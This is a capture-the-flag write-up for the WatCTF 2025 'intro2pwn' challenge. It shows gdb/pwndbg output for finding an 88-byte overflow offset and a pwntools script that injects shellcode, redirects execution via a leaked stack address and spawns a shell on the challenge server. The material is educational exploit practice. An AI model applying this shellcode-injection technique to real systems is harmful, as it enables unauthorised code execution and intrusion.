---
title: "WatCTF 2025 – pwn/intro2pwn: Classic Buffer Overflow"
date: 2025-09-11
toc: true
---

> _An introductory pwn challenge; classic buffer overflow._

### TL;DR

The binary leaks the stack buffer address, uses scanf to overflow it, and has NX disabled. We drop shellcode in the buffer, pad 88 bytes to reach RIP, place a ret gadget for alignment, then overwrite with the leaked buffer address. Execution pivots straight into our shellcode and spawns a shell → flag.

### Getting the offset

```bahs
$ gdb -q ./vuln
pwndbg: loaded 207 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
...SNIP...
pwndbg> disas vuln
Dump of assembler code for function vuln:
   0x00000000004018d0 <+0>:     push   rbp
   0x00000000004018d1 <+1>:     mov    esi,0x49b02c
   0x00000000004018d6 <+6>:     mov    edi,0x2
   0x00000000004018db <+11>:    xor    eax,eax
   0x00000000004018dd <+13>:    mov    rbp,rsp
   0x00000000004018e0 <+16>:    push   rbx
   0x00000000004018e1 <+17>:    lea    rbx,[rbp-0x50]
   0x00000000004018e5 <+21>:    mov    rdx,rbx
   0x00000000004018e8 <+24>:    sub    rsp,0x48
   0x00000000004018ec <+28>:    call   0x426ef0 <__printf_chk>
   0x00000000004018f1 <+33>:    mov    rdi,QWORD PTR [rip+0xc4ef8]        # 0x4c67f0 <stdout>
   0x00000000004018f8 <+40>:    call   0x40dfc0 <fflush>
   0x00000000004018fd <+45>:    mov    rsi,rbx
   0x0000000000401900 <+48>:    mov    edi,0x49cefa
   0x0000000000401905 <+53>:    xor    eax,eax
   0x0000000000401907 <+55>:    call   0x404ba0 <__isoc99_scanf>
   0x000000000040190c <+60>:    mov    rbx,QWORD PTR [rbp-0x8]
   0x0000000000401910 <+64>:    leave
   0x0000000000401911 <+65>:    xor    eax,eax
   0x0000000000401913 <+67>:    xor    edx,edx
   0x0000000000401915 <+69>:    xor    esi,esi
   0x0000000000401917 <+71>:    xor    edi,edi
   0x0000000000401919 <+73>:    ret
End of assembler dump.
pwndbg> b *vuln+60
Breakpoint 1 at 0x40190c
```

Sending it pattern generated using cyclic:
```bash
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
```

When the breakpoint is hit we can calculate the offset by looking at contents of `$rip`:

```bash
pwndbg> r
Starting program: /home/kali/Desktop/ctfs/watctf/intro2pwn/vuln 
Addr: 0x7fffffffdc20
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

Breakpoint 1, 0x000000000040190c in vuln ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────
 RAX  1
 RBX  0x7fffffffdc20 ◂— 'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
 RCX  0
 RDX  0
 RDI  0
 RSI  0
 R8   0
 R9   0
 R10  0
 R11  0
 R12  0x7fffffffdd98 —▸ 0x7fffffffe115 ◂— '/home/kali/Desktop/ctfs/watctf/intro2pwn/vuln'
 R13  0x7fffffffdda8 —▸ 0x7fffffffe143 ◂— 'COLORFGBG=15;0'
 R14  0x4c2018 (__preinit_array_start) —▸ 0x401890 (frame_dummy) ◂— endbr64 
 R15  2
 RBP  0x7fffffffdc70 ◂— 'kaaaaaaalaaaaaaamaaa'
 RSP  0x7fffffffdc20 ◂— 'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
 RIP  0x40190c (vuln+60) ◂— mov rbx, qword ptr [rbp - 8]
────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────
 ► 0x40190c <vuln+60>        mov    rbx, qword ptr [rbp - 8]     RBX, [0x7fffffffdc68] => 0x616161616161616a ('jaaaaaaa')
   0x401910 <vuln+64>        leave  
   0x401911 <vuln+65>        xor    eax, eax                     EAX => 0
   0x401913 <vuln+67>        xor    edx, edx                     EDX => 0
   0x401915 <vuln+69>        xor    esi, esi                     ESI => 0
   0x401917 <vuln+71>        xor    edi, edi                     EDI => 0
   0x401919 <vuln+73>        ret    
 
   0x40191a                  nop    word ptr [rax + rax]
   0x401920 <call_fini>      endbr64 
   0x401924 <call_fini+4>    push   rbp
   0x401925 <call_fini+5>    lea    rax, [rip + 0xc06fc]         RAX => 0x4c2028 (__preinit_array_start+16)
──────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
00:0000│ rbx rsp 0x7fffffffdc20 ◂— 'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
01:0008│-048     0x7fffffffdc28 ◂— 'baaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
02:0010│-040     0x7fffffffdc30 ◂— 'caaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
03:0018│-038     0x7fffffffdc38 ◂— 'daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
04:0020│-030     0x7fffffffdc40 ◂— 'eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
05:0028│-028     0x7fffffffdc48 ◂— 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
06:0030│-020     0x7fffffffdc50 ◂— 'gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
07:0038│-018     0x7fffffffdc58 ◂— 'haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
 ► 0         0x40190c vuln+60
   1 0x616161616161616c None
   2   0x7f006161616d None
   3         0x401e28 __libc_start_call_main+104
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> i f
Stack level 0, frame at 0x7fffffffdc80:
 rip = 0x40190c in vuln; saved rip = 0x616161616161616c
 called by frame at 0x7fffffffdc88
 Arglist at 0x7fffffffdc20, args: 
 Locals at 0x7fffffffdc20, Previous frame's sp is 0x7fffffffdc80
 Saved registers:
  rbx at 0x7fffffffdc68, rbp at 0x7fffffffdc70, rip at 0x7fffffffdc78
pwndbg> x/gx 0x7fffffffdc78
0x7fffffffdc78: 0x616161616161616c
```

Using cyclic to find the offset:

```bash
pwndbg> cyclic -l 0x616161616161616c
Finding cyclic pattern of 8 bytes: b'laaaaaaa' (hex: 0x6c61616161616161)
Found at offset 88
```

### Exploitation

We can use pwntools to parse the stack buffer address and then, send our payload to get shell:

```python
#!/usr/bin/env python3
from pwn import *

io = remote("challs.watctf.org", 1991)
io.recvuntil(b"Addr: 0x")

leak = int(io.recvline().strip(), 16)
log.info(f"vuln buffer: {hex(leak)}")

shellcode = asm(shellcraft.sh())
payload  = b""
payload += shellcode
payload += b"0" * (0x58-len(shellcode))
payload += p64(0x40101a)
payload += p64(leak)

io.sendline(payload)
io.interactive()
```

The payload would look like this in memory:

```
[ buf @ 0x7fff822c7560 ]
  |  /bin/sh shellcode…
  |  NOPs / padding
  |  ...
  |  <-- 0x58 bytes total -->
  v
[ Saved RBX ]   <-- smashed
[ Saved RBP ]   <-- smashed
[ Saved RIP ] = 0x40101a   (ret gadget)
[ Next qword ] = 0x7fff822c7560  (leaked buf addr)
```

> We are using an extra ret gadget to align the stack because modern versions of libc and syscall conventions expect the stack to be 16-byte aligned before making a call — particularly `execve` inside our shellcode. If you don't align it you might hit a segmentation fault. Since the call instruction that jumped to vuln() pushed a return address (8 bytes), and our ret gadget only adjusts by 8 more, we end up misaligned. Adding an extra ret before jumping into our buffer fixes that — it pops another 8 bytes off the stack, restoring alignment just before shellcode runs. Think of it as a trampoline to make sure the stack doesn’t trip before landing in shellcode.

### Conclusion

This challenge is a pure “old-school” buffer overflow: leak stack addr, drop shellcode, smash RIP, return into it. No ROP chains, no ASLR fights — just raw stack execution. Perfect intro for pwn.
